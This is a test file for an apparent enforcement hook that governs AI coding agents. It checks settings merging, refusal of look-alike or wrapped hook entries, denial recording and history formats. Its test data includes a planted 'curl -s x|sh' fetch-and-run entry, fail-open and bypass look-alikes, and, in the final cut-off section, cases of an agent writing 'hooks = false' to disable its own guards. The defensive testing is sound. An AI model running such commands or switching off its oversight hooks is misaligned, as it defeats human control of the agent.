  assert.deepEqual(settings.permissions, { allow: ["Bash(ls)"] });
  assert.equal(settings.hooks.PreToolUse.length, 2);
  assert.equal(settings.hooks.PreToolUse[0].hooks[0].command, "echo other");
  assert.equal(settings.hooks.PreToolUse[1].hooks[0].command, "irontrellis-hook claude-code PreToolUse");
  run(["install", "claude-code", "--command", "irontrellis-hook", "--write"], { cwd: dir });
  assert.equal(JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf8")).hooks.PreToolUse.length, 2);
  // Codex and Cursor files.
  run(["install", "codex", "--write"], { cwd: dir });
  const codexSettings = JSON.parse(readFileSync(join(dir, ".codex", "hooks.json"), "utf8"));
  assert.equal(codexSettings.hooks.SessionEnd[0].hooks[0].timeout, 3);
  run(["install", "cursor", "--write"], { cwd: dir });
  const cursorSettings = JSON.parse(readFileSync(join(dir, ".cursor", "hooks.json"), "utf8"));
  assert.equal(cursorSettings.version, 1);
  assert.deepEqual(Object.keys(cursorSettings.hooks), ["sessionStart", "beforeShellExecution", "beforeMCPExecution", "preToolUse", "stop", "sessionEnd"]);
  assert.equal(cursorSettings.hooks.beforeShellExecution[0].failClosed, true);
  // mergeSettings keeps `version` and foreign keys.
  const merged = mergeSettings({ version: 1, other: true, hooks: { stop: [{ command: "x" }] } }, PROTOCOLS.cursor.install("irontrellis-hook"));
  assert.equal(merged.other, true);
  assert.equal(merged.hooks.stop.length, 2);
  assert.equal(run(["install"], { cwd: dir }).code, 1);
});

test("install --write on existing settings: unrelated hooks and settings kept, our old command replaced in place, idempotent, --dry-run shows the diff", () => {
  const dir = project();
  mkdirSync(join(dir, ".claude"));
  const file = join(dir, ".claude", "settings.json");
  const unrelated = { matcher: "Bash", hooks: [{ type: "command", command: "./lint.sh", timeout: 5 }] };
  const post = [{ hooks: [{ type: "command", command: "echo done" }] }];
  // An earlier install with another --command (npx), a hook group of ours with a user's matcher, a duplicate of ours.
  const original = {
    model: "opus", permissions: { allow: ["Bash(ls:*)"], deny: [] }, env: { A: "1" },
    hooks: {
      PreToolUse: [unrelated, { hooks: [{ type: "command", command: "npx --no-install irontrellis-hook claude-code PreToolUse", timeout: 30 }] }],
      PostToolUse: post,
      Stop: [{ matcher: "*", hooks: [{ type: "command", command: "echo before-stop" }, { type: "command", command: "/usr/local/bin/irontrellis-hook claude-code Stop", timeout: 5 }] }],
      SessionEnd: [{ hooks: [{ type: "command", command: "irontrellis-hook claude-code SessionEnd", timeout: 10 }] }, { hooks: [{ type: "command", command: "irontrellis-hook claude-code SessionEnd", timeout: 10 }] }],
    },
  };
  const text = `${JSON.stringify(original, null, 4)}\n`;
  writeFileSync(file, text);
  // --dry-run: the changes and a diff, nothing written.
  const dry = run(["install", "claude-code", "--command", "irontrellis-hook", "--dry-run"], { cwd: dir });
  assert.equal(dry.code, 0, dry.stderr);
  assert.match(dry.stdout, /^would update .*settings\.json:/);
  assert.match(dry.stdout, /\+ hooks\.SessionStart: irontrellis-hook claude-code SessionStart \(timeout 30\)/);
  assert.match(dry.stdout, /~ hooks\.PreToolUse: npx --no-install irontrellis-hook claude-code PreToolUse \(timeout 30\) {2}-> {2}irontrellis-hook claude-code PreToolUse \(timeout 30\) onFailure block/);
  assert.match(dry.stdout, /~ hooks\.Stop: \/usr\/local\/bin\/irontrellis-hook claude-code Stop \(timeout 5\)/);
  assert.match(dry.stdout, /- hooks\.SessionEnd: irontrellis-hook claude-code SessionEnd \(timeout 10\) \(duplicate\)/);
  assert.match(dry.stdout, /\n--- \.claude\/settings\.json\n\+\+\+ \.claude\/settings\.json\n@@ /);
  assert.match(dry.stdout, /\n- {24}"command": "npx --no-install irontrellis-hook claude-code PreToolUse",\n- {24}"timeout": 30\n\+ {24}"command": "irontrellis-hook claude-code PreToolUse",\n\+ {24}"timeout": 30,\n\+ {24}"onFailure": "block"\n/);
  assert.equal(readFileSync(file, "utf8"), text, "--dry-run writes nothing");
  const dryJson = run(["install", "claude-code", "--command", "irontrellis-hook", "--dry-run", "--json"], { cwd: dir }).json;
  assert.equal(dryJson.written, false);
  assert.equal(dryJson.changed, true);
  assert.deepEqual(dryJson.changes.map((c) => `${c.kind} ${c.path}`), ["added hooks.SessionStart", "updated hooks.PreToolUse", "updated hooks.Stop", "removed hooks.SessionEnd", "unchanged hooks.SessionEnd"]);
  // --write: exactly those changes.
  const written = run(["install", "claude-code", "--command", "irontrellis-hook", "--write"], { cwd: dir });
  assert.equal(written.code, 0, written.stderr);
  assert.match(written.stdout, /^updated .*settings\.json:\n {2}\+ hooks\.SessionStart/);
  const after = readFileSync(file, "utf8");
  assert.match(after, /^\{\n {4}"model"/, "the file's indentation is kept");
  const settings = JSON.parse(after);
  const expected = structuredClone(original);
  expected.hooks.PreToolUse[1].hooks[0].command = "irontrellis-hook claude-code PreToolUse";
  expected.hooks.PreToolUse[1].hooks[0].onFailure = "block"; // post5-11 (KI 61)
  expected.hooks.Stop[0].hooks[1] = { type: "command", command: "irontrellis-hook claude-code Stop", timeout: 30 };
  expected.hooks.SessionEnd = [expected.hooks.SessionEnd[0]];
  expected.hooks.SessionStart = [{ hooks: [{ type: "command", command: "irontrellis-hook claude-code SessionStart", timeout: 30 }] }];
  assert.deepEqual(settings, expected, "only our handlers changed; everything else (keys, order, the user's handlers and matchers) is as it was");
  assert.deepEqual(Object.keys(settings), ["model", "permissions", "env", "hooks"]);
  assert.deepEqual(Object.keys(settings.hooks), ["PreToolUse", "PostToolUse", "Stop", "SessionEnd", "SessionStart"]);
  // Idempotent: a second run changes nothing and does not rewrite the file.
  const before = statSync(file).mtimeMs;
  const again = run(["install", "claude-code", "--command", "irontrellis-hook", "--write"], { cwd: dir });
  assert.equal(again.code, 0, again.stderr);
  assert.match(again.stdout, /is up to date; nothing written/);
  assert.equal(readFileSync(file, "utf8"), after);
  assert.equal(statSync(file).mtimeMs, before);
  assert.equal(run(["install", "claude-code", "--command", "irontrellis-hook", "--dry-run"], { cwd: dir }).stdout.includes("nothing would change"), true);
  // --command switches every entry of ours in place (the block 3 gap: it used to change nothing).
  const switched = run(["install", "claude-code", "--write", "--command", "npx --no-install irontrellis-hook", "--json"], { cwd: dir }).json;
  assert.deepEqual(switched.changes.map((c) => c.kind), ["updated", "updated", "updated", "updated"]);
  const npx = JSON.parse(readFileSync(file, "utf8"));
  assert.equal(npx.hooks.PreToolUse[1].hooks[0].command, "npx --no-install irontrellis-hook claude-code PreToolUse");
  assert.deepEqual(npx.hooks.PreToolUse[0], unrelated);
  assert.deepEqual(npx.hooks.PostToolUse, post);
  // A custom --command without irontrellis-hook in it is recognised as ours when given again.
  run(["install", "claude-code", "--write", "--command", "/opt/wrap/it-hook"], { cwd: dir });
  const custom = run(["install", "claude-code", "--write", "--command", "/opt/wrap/it-hook", "--json"], { cwd: dir }).json;
  assert.equal(custom.changed, false);
});

test("install refuses malformed or unmergeable settings with a clear message and leaves the file as it is", () => {
  const dir = project();
  mkdirSync(join(dir, ".claude"));
  const file = join(dir, ".claude", "settings.json");
  const refused = (content, pattern) => {
    writeFileSync(file, content);
    for (const args of [["install", "claude-code", "--write"], ["install", "claude-code", "--dry-run"], ["install", "claude-code"]]) {
      const r = run(args, { cwd: dir });
      assert.equal(r.code, 1, `${args.join(" ")} on ${content}`);
      assert.match(r.stderr, pattern);
      assert.equal(readFileSync(file, "utf8"), content, "the file is untouched");
    }
  };
  refused('{ "hooks": { "PreToolUse": [ } ', /settings\.json is not valid JSON \(.*\); refusing to overwrite it: fix it or move it aside/);
  refused("// comment\n{}", /is not valid JSON/);
  refused("", /is not valid JSON/);
  refused("[1, 2]", /is not a JSON object; refusing to overwrite it/);
  refused('{"hooks": []}', /"hooks" is not an object; refusing/);
  refused('{"hooks": {"PreToolUse": {"x": 1}}}', /"hooks\.PreToolUse" is not a list; refusing/);
  // An entry that mentions irontrellis-hook but is not what install writes: ambiguous, never duplicated or rewritten.
  refused(JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "irontrellis-hook claude-code PreToolUse --verbose" }] }] } }), /hooks\.PreToolUse has an entry install cannot classify: .*it mentions irontrellis-hook but is not an entry install writes\. Refusing to change the file: edit or remove that entry by hand/);
  refused(JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "irontrellis-hook claude-code SessionEnd" }] }] } }), /hooks\.Stop has an entry install cannot classify/);
});

test("install on Cursor and Codex files: our handlers replaced in place, foreign ones and version kept", () => {
  const dir = project();
  mkdirSync(join(dir, ".cursor"));
  const file = join(dir, ".cursor", "hooks.json");
  writeFileSync(file, JSON.stringify({ version: 2, hooks: { beforeShellExecution: [{ command: "./audit.sh" }, { command: "npx --no-install irontrellis-hook cursor beforeShellExecution", timeout: 30 }], afterFileEdit: [{ command: "./fmt.sh" }] } }, null, 2));
  const r = run(["install", "cursor", "--write", "--json"], { cwd: dir });
  assert.equal(r.code, 0, r.stderr);
  const cursor = JSON.parse(readFileSync(file, "utf8"));
  assert.equal(cursor.version, 2, "an existing version is not overwritten");
  assert.deepEqual(cursor.hooks.beforeShellExecution, [{ command: "./audit.sh" }, { command: "irontrellis-hook cursor beforeShellExecution", timeout: 30, failClosed: true }]);
  assert.deepEqual(cursor.hooks.afterFileEdit, [{ command: "./fmt.sh" }]);
  assert.equal(run(["install", "cursor", "--write", "--json"], { cwd: dir }).json.changed, false);
  mkdirSync(join(dir, ".codex"));
  const codexFile = join(dir, ".codex", "hooks.json");
  writeFileSync(codexFile, JSON.stringify({ hooks: { SessionEnd: [{ hooks: [{ type: "command", command: "irontrellis-hook codex SessionEnd", timeout: 10 }] }] } }));
  const codex = run(["install", "codex", "--write", "--json"], { cwd: dir }).json;
  assert.deepEqual(codex.changes.find((c) => c.path === "hooks.SessionEnd"), { kind: "updated", path: "hooks.SessionEnd", before: { type: "command", command: "irontrellis-hook codex SessionEnd", timeout: 10 }, after: { type: "command", command: "irontrellis-hook codex SessionEnd", timeout: 3 } });
  assert.equal(JSON.parse(readFileSync(codexFile, "utf8")).hooks.SessionEnd[0].hooks[0].timeout, 3);
});

test("review block 5: install counts only a catch-all guard, refuses wrappers and look-alikes, disableAllHooks and lossy numbers; --replace-command; atomic write", () => {
  const dir = project();
  mkdirSync(join(dir, ".claude"));
  const file = join(dir, ".claude", "settings.json");
  const ours = (ev, t = 30) => ({ type: "command", command: `irontrellis-hook claude-code ${ev}`, timeout: t, ...(ev === "PreToolUse" ? { onFailure: "block" } : {}) });
  const refused = (doc, pattern, args = []) => {
    const text = typeof doc === "string" ? doc : JSON.stringify(doc, null, 2);
    writeFileSync(file, text);
    for (const mode of [["--write"], ["--dry-run"]]) {
      const r = run(["install", "claude-code", ...mode, ...args], { cwd: dir });
      assert.equal(r.code, 1, `${mode} ${text}\n${r.stdout}`);
      assert.match(r.stderr, pattern);
      assert.equal(readFileSync(file, "utf8"), text, "the file is untouched");
    }
  };
  // H1, PoC A1: a narrow-matcher copy planted before the real catch-all guard. The old code kept the narrow one and
  // removed the real guard as a "duplicate". Now: refused, naming the matcher; nothing removed.
  refused({ hooks: { PreToolUse: [{ matcher: "NoSuchTool", hooks: [ours("PreToolUse")] }, { hooks: [ours("PreToolUse")] }] } }, /hooks\.PreToolUse has IronTrellis's hook under matcher "NoSuchTool", so it would run only for those tools; refusing/);
  // H1, PoC A2: the only copy moved under a narrow matcher: never "up to date".
  refused({ hooks: { PreToolUse: [{ matcher: "Read", hooks: [ours("PreToolUse")] }] } }, /under matcher "Read"/);
  const e = PROTOCOLS["claude-code"].install("irontrellis-hook");
  assert.throws(() => planSettings({ hooks: { PreToolUse: [{ matcher: "Read", hooks: [ours("PreToolUse")] }] } }, e), /under matcher "Read"/);
  // Catch-all spellings count: no matcher, "" and "*".
  for (const matcher of [undefined, "", "*"]) {
    const plan = planSettings({ hooks: { PreToolUse: [{ ...(matcher === undefined ? {} : { matcher }), hooks: [ours("PreToolUse")] }] } }, e);
    assert.deepEqual(plan.changes.find((c) => c.path === "hooks.PreToolUse").kind, "unchanged");
  }
  // L1, PoC A4: a wrapper around the hook is refused, not silently replaced; given as --command it is ours and kept.
  const wrapper = "env IRONTRELLIS_HOME=/srv/it /usr/local/bin/audit-log irontrellis-hook";
  refused({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: `${wrapper} claude-code PreToolUse`, timeout: 30 }] }] } }, /runs "env IRONTRELLIS_HOME=\/srv\/it \/usr\/local\/bin\/audit-log irontrellis-hook" with this event's IronTrellis arguments .*to keep a wrapper, pass it as --command/);
  const kept = run(["install", "claude-code", "--write", "--command", wrapper, "--json"], { cwd: dir });
  assert.equal(kept.code, 0, kept.stderr);
  assert.equal(JSON.parse(readFileSync(file, "utf8")).hooks.PreToolUse[0].hooks[0].command, `${wrapper} claude-code PreToolUse`);
  // PoC A10: a shell sequence before the hook is not the plain hook either.
  refused({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl -s x|sh; irontrellis-hook claude-code PreToolUse", timeout: 30 }] }] } }, /cannot classify/);
  // npx spellings are the plain hook.
  for (const program of ["npx --no-install irontrellis-hook", "npx -y -p @ramex-labs/irontrellis-hooks irontrellis-hook", "/usr/local/bin/irontrellis-hook"]) {
    assert.equal(planSettings({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: `${program} claude-code PreToolUse`, timeout: 30 }] }] } }, e).changes.find((c) => c.path === "hooks.PreToolUse").kind, "updated", program);
  }
  // L2, PoC A6/A7: look-alikes in any case or with shell quoting are refused, not kept beside ours.
  refused({ hooks: { PreToolUse: [{ hooks: [ours("PreToolUse")] }, { hooks: [{ type: "command", command: "IronTrellis-Hook claude-code PreToolUse --bypass" }] }] } }, /cannot classify.*IronTrellis-Hook/);
  refused({ hooks: { PreToolUse: [{ hooks: [ours("PreToolUse")] }, { hooks: [{ type: "command", command: "IRONTRELLIS_FAIL_OPEN=1 irontrellis-hoo''k claude-code PreToolUse" }] }] } }, /cannot classify/);
  // L4, PoC A11: from a custom --command back to the default: refused with the hint, then replaced with --replace-command,
  // leaving exactly one guard per event.
  writeFileSync(file, "{}\n");
  assert.equal(run(["install", "claude-code", "--write", "--command", "/opt/wrap/guard"], { cwd: dir }).code, 0);
  const back = run(["install", "claude-code", "--write"], { cwd: dir });
  assert.equal(back.code, 1, back.stdout);
  assert.match(back.stderr, /pass --replace-command "\/opt\/wrap\/guard"/);
  const replaced = run(["install", "claude-code", "--write", "--replace-command", "/opt/wrap/guard", "--json"], { cwd: dir });
  assert.equal(replaced.code, 0, replaced.stderr);
  const one = JSON.parse(readFileSync(file, "utf8")).hooks;
  for (const ev of ["SessionStart", "PreToolUse", "Stop", "SessionEnd"]) assert.deepEqual(one[ev].flatMap((g) => g.hooks.map((h) => h.command)), [`${OURS} claude-code ${ev}`]);
  // L3, PoC A3: disableAllHooks is refused (exit 1, file untouched) unless --allow-disabled, which warns loudly.
  refused({ disableAllHooks: true, hooks: {} }, /WARNING: "disableAllHooks": true in .*settings\.json: the host runs NO hooks.*--allow-disabled/);
  const allowed = run(["install", "claude-code", "--write", "--allow-disabled"], { cwd: dir });
  assert.equal(allowed.code, 0, allowed.stderr);
  assert.match(allowed.stderr, /WARNING: "disableAllHooks": true/);
  writeFileSync(join(dir, ".claude", "settings.local.json"), JSON.stringify({ disableAllHooks: true }));
  refused({ hooks: {} }, /settings\.local\.json: the host runs NO hooks/);
  rmSync(join(dir, ".claude", "settings.local.json"));
  // L5: numbers JSON cannot write back exactly are refused before a rewrite; an up-to-date file with them is fine.
  refused('{ "big": 12345678901234567890, "hooks": {} }\n', /holds the number 12345678901234567890, which JSON cannot write back exactly \(it would become 12345678901234567000\)/);
  refused('{ "f": 1.0, "hooks": {} }\n', /holds the number 1\.0/);
  // --write shows the diff too.
  writeFileSync(file, '{ "model": "opus" }\n');
  const shown = run(["install", "claude-code", "--write"], { cwd: dir });
  assert.match(shown.stdout, /^updated .*\n {2}\+ hooks\.SessionStart[\s\S]*\n--- \.claude\/settings\.json\n\+\+\+ \.claude\/settings\.json\n@@ /);
  const upToDate = readFileSync(file, "utf8").replace('"model": "opus"', '"model": "opus", "n": 1.50');
  writeFileSync(file, upToDate);
  assert.match(run(["install", "claude-code", "--write"], { cwd: dir }).stdout, /is up to date; nothing written/);
  assert.equal(readFileSync(file, "utf8"), upToDate);
  // M4: atomic, through a symlink (kept), with the file's mode, no temporary files left; a concurrent change aborts.
  const real = join(dir, "real-settings.json");
  writeFileSync(real, '{ "model": "opus" }\n', { mode: 0o600 });
  chmodSync(real, 0o600);
  rmSync(file);
  symlinkSync(real, file);
  assert.equal(run(["install", "claude-code", "--write"], { cwd: dir }).code, 0);
  assert.ok(lstatSync(file).isSymbolicLink(), "the settings file is still a symlink");
  assert.equal(statSync(real).mode & 0o777, 0o600, "the mode is kept");
  assert.equal(JSON.parse(readFileSync(real, "utf8")).hooks.PreToolUse[0].hooks[0].command, `${OURS} claude-code PreToolUse`);
  assert.deepEqual(readdirSync(dir).filter((n) => n.includes(".tmp")), []);
  assert.deepEqual(readdirSync(join(dir, ".claude")).filter((n) => n.includes(".tmp")), []);
  const before = readFileSync(real, "utf8");
  assert.throws(() => writeSettingsAtomically(file, "{}\n", "{ \"something\": \"else\" }\n"), /changed while install was running.*nothing was written/);
  assert.equal(readFileSync(real, "utf8"), before);
  assert.deepEqual(readdirSync(dir).filter((n) => n.includes(".tmp")), []);
});

test("check dry-runs a decision without a host", () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  // No host session is involved, so no session check; ALLOW is shown as the hook would answer it (defer by default).
  const ok = run(["check", "claude-code", "Bash", "--input", '{"command":"ls"}'], { cwd: dir });
  assert.equal(ok.code, 0, ok.stderr);
  assert.match(ok.stdout, /^DEFER  IronTrellis · ALLOW/);
  const denied = run(["check", "claude-code", "Write", "--json"], { cwd: dir });
  assert.equal(denied.code, 2);
  assert.equal(denied.json.verdict, "deny");
  assert.equal(run(["check", "claude-code", "Deploy"], { cwd: dir }).stdout.startsWith("ASK"), true);
});

test("--version prints the package version and exits 0; no arguments prints the usage and exits 1", () => {
  const version = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8")).version;
  for (const args of [["--version"], ["version"]]) {
    const r = run(args, { cwd: tmpdir() });
    assert.equal(r.code, 0, r.stderr);
    assert.equal(r.stdout, `${version}\n`);
  }
  const help = run(["--help"], { cwd: tmpdir() });
  assert.equal(help.code, 0);
  assert.match(help.stdout, /^irontrellis-hook /);
  assert.equal(run([], { cwd: tmpdir() }).code, 1);
});

test("A-41 / A-85 / A-185.3: init writes format 2 without the opt-in; it refuses to reuse a format-1 history; a format-1 config opted in by hand warns on every open and is read-only (SessionStart refused, tool calls denied, nothing recorded), without the opt-in it is refused (exit 2; a non-blocking error with failOpen); a fenced history is refused whatever the config says", async () => {
  const { migrateHistory, TRELLIS_FORMAT } = await import("@ramex-labs/irontrellis");
  const { ensureAgent, loadConfigFile } = await import("../dist/index.js");
  const dir = project();
  const init = run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  assert.equal(init.code, 0, init.stderr);
  assert.equal(configOf(dir).enforceFromReadOnlyHistory, undefined, "A-85: the generated config never opts in");
  assert.equal(configOf(dir).historyId, openHistoryStore(historyOf(dir)).state().eventHistoryHashes[0], "A-19.4: init pins the history it created");
  assert.equal(openHistoryStore(historyOf(dir)).format, "irontrellis-event/2");
  assert.doesNotMatch(init.stdout + init.stderr, /enforceFromReadOnlyHistory/);
  // A format-1 history (written through the core's test-only format-1 writer): init refuses to reuse it.
  const old = project(), oldHistory = join(old, "history.jsonl");
  const config = configOf(dir);
  const writer = await createLocalOwner({ historyFile: oldHistory, domain: createLocalDomain({ format: TRELLIS_FORMAT, [FORMAT1_TEST_TOOLING]: true }), owner: config.owner, controller: config.controller, now: () => Date.now(), format: TRELLIS_FORMAT, [FORMAT1_TEST_TOOLING]: true });
  const refusedInit = run(["init", "--history", "history.jsonl"], { cwd: old });
  assert.equal(refusedInit.code, 1);
  assert.match(refusedInit.stderr, /format-1 history, which this release reads but does not write: migrate it/);
  // An operator who keeps enforcing from it writes the opt-in by hand.
  const { historyId: _other, ...copied } = config;
  const oldConfig = { ...copied, history: oldHistory, domain: writer.exportHistory()[0].data.domain, enforceFromReadOnlyHistory: true };
  await ensureAgent(writer, loadConfigFile(join(dir, "irontrellis-hook.json")));
  await writer.grant({ id: "grant:old", to: config.agentId, actions: ["run-shell"], resources: [`repo:${old}`], expiresAt: Date.now() + DAY });
  writer.close();
  writeFileSync(join(old, "irontrellis-hook.json"), JSON.stringify(oldConfig));
  // A-185.3 (fail closed): the opt-in is read-only. SessionStart would have to record the session's admission, so it is
  // refused with an actionable message; the tool call that follows is then refused, saying why (A-206.3: FORMAT_READ_ONLY
  // with the remedy, not only SESSION_NOT_FOUND), and the history gains no event: nothing governed happens without its record.
  const eventsBefore = openHistoryStore(oldHistory).state().events.length;
  const started = hook("claude-code", "SessionStart", claude.sessionStart(old), old);
  assert.match(started.stderr, /FORMAT_READ_ONLY: the history .* is format-1 and read-only \(SPEC §16\.1\): enforcement from it is read-only, so this session is not admitted and nothing is recorded; run `irontrellis migrate` to write/);
  const call = () => hook("claude-code", "PreToolUse", claude.preToolUse(old, "Bash", { command: "npm test", description: "Run tests" }), old);
  const warned = call();
  assert.equal(warned.code, 2, "the read-only history's refusal is exit 2 (item 4)"); assert.equal(warned.stdout, "");
  assert.equal(warned.json.hookSpecificOutput.permissionDecision, "deny", warned.stdout);
  assert.match(warned.json.hookSpecificOutput.permissionDecisionReason, /^IronTrellis · DENY: the history .* is format-1 and read-only \(SPEC §16\.1\): no session is admitted from it, so every tool call is denied and nothing is recorded; run `irontrellis migrate` to write \(FORMAT_READ_ONLY\)$/);
  assert.equal(openHistoryStore(oldHistory).state().events.length, eventsBefore, "no admission or other event was recorded");
  assert.match(warned.stderr, /(^|\n)IronTrellis: enforcing from the format-1 history .* \(enforceFromReadOnlyHistory\)/);
  assert.match(call().stderr, /IronTrellis: enforcing from the format-1 history/, "on every open");
  setConfig(old, { enforceFromReadOnlyHistory: false });
  const refused = call();
  assert.equal(refused.code, 2, refused.stderr);
  assert.match(refused.stderr, /FORMAT_READ_ONLY.*enforcement callers refuse it \(A-41\)/);
  setConfig(old, { enforceFromReadOnlyHistory: false, failOpen: true });
  assert.notEqual(call().code, 2, "failOpen: the refusal is a non-blocking error");
  // Fenced: the source is refused with the opt-in set.
  await migrateHistory({ source: oldHistory, target: `${oldHistory}.v2.jsonl`, now: () => Date.now() });
  setConfig(old, { enforceFromReadOnlyHistory: true, failOpen: false });
  const fenced = call();
  assert.equal(fenced.code, 2, fenced.stderr);
  assert.match(fenced.stderr, /FORMAT_READ_ONLY.*was migrated to .*\.v2\.jsonl/);
});

test("A-38 / A-42 (format 2): a grant DENY is recorded as a CORE refusal of the host session; past recordBudgetMs it is spooled and the next call drains it; a rule that renders tool input is recorded as a CONNECTOR refusal by digest only", async () => {
  const { recordToolRefusal } = await import("../dist/index.js");
  const { loadConfigFile } = await import("../dist/config.js");
  const dir = project();
  const historyFile = join(dir, "history.jsonl");
  // A format-2 history made by the core; init reuses it.
  const created = await createLocalOwner({ historyFile, domain: createLocalDomain(), owner: "principal:owner", controller: "controller:irontrellis-hook", now: () => Date.now() });
  created.close();
  const init = run(["init", "--history", "history.jsonl", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  assert.equal(init.code, 0, init.stderr);
  assert.equal(configOf(dir).enforceFromReadOnlyHistory, undefined, "a format-2 history needs no opt-in");
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const refusals = () => openHistoryStore(historyFile).state().events.filter((e) => e.type === "REQUEST_REFUSED");
  const mcp = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "mcp__github__create_issue", { title: "x" }), dir);
  assert.equal(mcp.json.hookSpecificOutput.permissionDecision, "deny");
  const [first] = refusals();
  assert.equal(first.data.refusalSource, "CORE");
  assert.deepEqual([first.data.request.actorId, first.data.request.action, first.data.request.resource], ["claude-code", "call-mcp", "mcp:github"]);
  // A budget of 0 ms: spooled; the next recording drains it first (coalescing may then skip the repeat: same request within 60 s).
  const config = loadConfigFile(join(dir, "irontrellis-hook.json"));
  const spooled = await recordToolRefusal(config, "cc-session-1", { action: "call-mcp", resource: "mcp:linear" }, () => Date.now(), 0);
  assert.deepEqual(spooled, { recorded: false, reason: "SPOOLED" });
  await new Promise((r) => setTimeout(r, 300));
  await recordToolRefusal(config, "cc-session-1", { action: "call-mcp", resource: "mcp:jira" }, () => Date.now());
  assert.equal(existsSync(`${historyFile}.refusals.spool`), false, "drained");
  assert.ok(refusals().some((e) => e.data.request.resource === "mcp:linear"));
  // A-42: a template rendering tool input → CONNECTOR refusal with the template and a digest; the rendered text stays in the side log.
  const connector = await recordToolRefusal(config, "cc-session-1", { action: "write-file", resource: "file:/secret/path", code: "NO_AUTHORITY", template: "file:${file_path}", rendersToolInput: true }, () => Date.now());
  assert.equal(typeof connector.eventId, "string");
  const event = refusals().find((e) => e.data.refusalSource === "CONNECTOR");
  assert.equal(event.data.request.resource, "file:${file_path}");
  assert.equal(event.data.connector.refusalCode, "NO_AUTHORITY");
  // docs/API.md §2: signed by the hook's own connector session (admitted by init), never the agent's.
  assert.equal(event.data.connector.connectorId, configOf(dir).connector.agentId);
  assert.match(configOf(dir).connector.agentId, /^hooks:/);
  assert.ok(event.data.runtimeSessionId.startsWith(`${configOf(dir).connector.agentId}:`));
  assert.ok(!readFileSync(historyFile, "utf8").includes("/secret/path"), "the rendered input never enters the history");
  assert.match(readFileSync(`${historyFile}.refusals.rendered.log`, "utf8"), /secret\/path/);
});

test("A-22.4: a side-effecting call is denied with CLOCK_AHEAD_OF_READER when the history's head is dated more than 300 s past the host clock", async () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const config = configOf(dir);
  const ahead = openLocalOwner({ historyFile: historyOf(dir), domain: config.domain, owner: config.owner, controller: config.controller, now: () => Date.now() + 600_000 });
  await ahead.createRole({ id: "role:future" });
  const r = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test", description: "Run tests" }), dir);
  assert.equal(r.code, 2, "the clock refusal is exit 2 (item 4)"); assert.equal(r.stdout, "");
  assert.equal(r.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(r.json.hookSpecificOutput.permissionDecisionReason, /CLOCK_AHEAD_OF_READER/);
});

test("A-38.4: a side-effecting call of an agent whose session was released is refused and recorded as a CONNECTOR refusal of the hook's own session; init admits that session once and reuses it", async () => {
  const dir = project();
  const init = run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  assert.equal(init.code, 0, init.stderr);
  const connector = configOf(dir).connector.agentId;
  const state = () => openHistoryStore(historyOf(dir)).state();
  const sessions = () => [...state().runtimeSessions.values()].filter((x) => x.agentId === connector).length;
  assert.equal(sessions(), 1);
  if (process.platform !== "win32") assert.equal(statSync(`${historyOf(dir)}.connector.json`).mode & 0o777, 0o600);
  // A second init keeps the current connector session.
  assert.equal(run(["init", "--force"], { cwd: dir }).code, 0);
  assert.equal(sessions(), 1);
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  assert.equal(run(["session", "release", "--all"], { cwd: dir }).code, 0);
  const r = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "npm test", description: "Run tests" }), dir);
  assert.equal(r.json.hookSpecificOutput.permissionDecision, "deny");
  const refusal = state().events.filter((e) => e.type === "REQUEST_REFUSED").at(-1);
  assert.equal(refusal.data.refusalSource, "CONNECTOR");
  assert.equal(refusal.data.connector.connectorId, connector);
  assert.equal(refusal.data.connector.refusalCode, "SESSION_NOT_FOUND");
  assert.equal(refusal.data.request.actorId, "claude-code");
});

test("JOB76-05 / A-206.3: readOnlyHistoryKind names a legacy and a format-1 history from line 0 (the FORMAT_READ_ONLY tool-call denial says which), and nothing for format 2", async (t) => {
  const { readOnlyHistoryKind } = await import("../dist/hook.js");
  const { createLocalOwner, createLocalDomain } = await import("@ramex-labs/irontrellis");
  const { readFileSync: read, writeFileSync: write, mkdtempSync: mk, rmSync: rm } = await import("node:fs");
  const { tmpdir: tmp } = await import("node:os");
  const { join: j } = await import("node:path");
  const dir = mk(j(tmp(), "irontrellis-hook-kind-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const firstLine = (path) => read(path, "utf8").split("\n")[0] + "\n";
  const legacy = j(dir, "legacy.jsonl"), format1 = j(dir, "format1.jsonl"), format2 = j(dir, "format2.jsonl");
  write(legacy, firstLine(new URL("../../reference-0.2/tests/fixtures/handover-history.jsonl", import.meta.url)));
  write(format1, firstLine(new URL("../../../conformance/v1/histories/handover-v1.jsonl", import.meta.url)));
  await createLocalOwner({ historyFile: format2, domain: createLocalDomain(), owner: "o", controller: "c", now: () => 100, witness: false });
  assert.equal(readOnlyHistoryKind({ history: legacy }), "legacy");
  assert.equal(readOnlyHistoryKind({ history: format1 }), "format-1");
  assert.equal(readOnlyHistoryKind({ history: format2 }), undefined);
});

// ---------------------------------------------------------------- GUARD-CODEX-CURSOR-01

// An agent under Codex or Cursor could switch its own hooks off for later sessions through the host's configuration
// (the coordinator 20261024T180559Z): rule 3 now guards the project's .codex/ and .cursor/ trees, Codex's config.toml and
// hooks.json in CODEX_HOME (else ~/.codex) and ~/.cursor/hooks.json, as it guards Claude Code's settings.
const hostCases = (dir, codexHome, home) => [
  ["Bash: hooks=false in the project's .codex/config.toml", "Bash", { command: `printf '[features]\\nhooks = false\\n' > ${dir}/.codex/config.toml` }],
